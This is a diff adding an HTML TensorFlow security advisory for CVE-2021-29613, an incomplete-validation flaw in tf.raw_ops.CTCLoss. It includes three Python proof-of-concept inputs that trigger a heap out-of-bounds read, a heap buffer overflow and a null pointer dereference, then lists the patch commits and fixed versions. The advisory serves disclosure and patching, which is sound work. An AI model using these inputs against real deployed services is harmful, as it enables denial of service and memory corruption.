@@ -1,0 +1,57 @@
+<h2>TFSA-2021-101: Incomplete validation in <code>tf.raw_ops.CTCLoss</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29613</p>
+<h3>Impact</h3>
+<p>Incomplete validation in <code>tf.raw_ops.CTCLoss</code> allows an attacker to trigger an
+OOB read from heap:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>inputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)
+labels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)
+labels_values = tf.constant([-100] * 8, shape=[8], dtype=tf.int32)
+sequence_length = tf.constant([-100] * 16, shape=[16], dtype=tf.int32)</p>
+<p>tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
+                   labels_values=labels_values, sequence_length=sequence_length,
+                   preprocess_collapse_repeated=True, ctc_merge_repeated=False,
+                   ignore_longer_outputs_than_inputs=True)
+```</p>
+<p>An attacker can also trigger a heap buffer overflow:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>inputs = tf.constant([], shape=[7, 2, 0], dtype=tf.float32)
+labels_indices = tf.constant([-100, -100], shape=[2, 1], dtype=tf.int64)
+labels_values = tf.constant([-100, -100], shape=[2], dtype=tf.int32)
+sequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)</p>
+<p>tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
+                   labels_values=labels_values, sequence_length=sequence_length,
+                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,
+                   ignore_longer_outputs_than_inputs=False)
+```</p>
+<p>Finally, an attacker can trigger a null pointer dereference:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>inputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)
+labels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)
+labels_values = tf.constant([], shape=[0], dtype=tf.int32)
+sequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)</p>
+<p>tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
+                   labels_values=labels_values, sequence_length=sequence_length,
+                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,
+                   ignore_longer_outputs_than_inputs=False)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c">14607c0707040d775e06b6817325640cb4b5864c</a>
+followed by GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/4504a081af71514bb1828048363e6540f797005b">4504a081af71514bb1828048363e6540f797005b</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
